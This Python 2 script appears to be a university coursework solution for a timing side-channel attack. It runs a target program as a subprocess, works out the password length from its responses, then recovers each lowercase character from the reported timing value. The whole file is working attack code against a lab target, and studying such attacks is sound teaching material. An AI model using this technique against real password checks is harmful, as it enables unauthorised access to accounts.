# Copyright (C) 2018 Daniel Page <csdsp@bristol.ac.uk>
#
# Use of this source code is restricted per the CC BY-NC-ND license, a copy of
# which can be found via http://creativecommons.org (and should be included as
# LICENSE.txt within the associated archive or repository).

import sys, subprocess

def interact( G ) :
  # send      G      to   attack target

  target_in.write( '%s\n' % ( G ) ) ; target_in.flush()

  # receive ( t, r ) from attack target

  t = int( target_out.readline().strip() )
  r = int( target_out.readline().strip() )

  return ( t, r )

def calculate_length():
  length = 1
  test = 'a'
  while(True):
    (t , r) = interact(test)
    if t == 1:
        return length
    length += 1
    test += 'a'
    
def attack() :
  # select a hard-coded guess ...
  # assume password is lower case  
  # ascii values of char are 97 -> 122
  
  length = calculate_length()
  r = 0
  confirmed_chars = ''
  confirmed_chars_count = 0
  to_find = ''
  for a in range(length):
      to_find += 'a'
  while(r==0):
    G = confirmed_chars + to_find
    ( t, r ) = interact( G )
    
    print 'G = %s' % ( G )
    print 't = %d' % ( t )
    print 'r = %d' % ( r )
    
    if t > confirmed_chars_count + 1:
        confirmed_chars = confirmed_chars + to_find[0]
        to_find = to_find[1:]
        confirmed_chars_count += 1
    else:
        to_find = chr(ord(to_find[0])+1) + to_find[1:]
        if to_find[0] == '{':
            to_find = 'a' + to_find[1:]
  print("Password found " + confirmed_chars)
if ( __name__ == '__main__' ) :
  # produce a sub-process representing the attack target

  target = subprocess.Popen( args   = sys.argv[ 1 ],
                             stdout = subprocess.PIPE,
                             stdin  = subprocess.PIPE )

  # construct handles to attack target standard input and output

  target_out = target.stdout
  target_in  = target.stdin

  # execute a function representing the attacker

  attack()
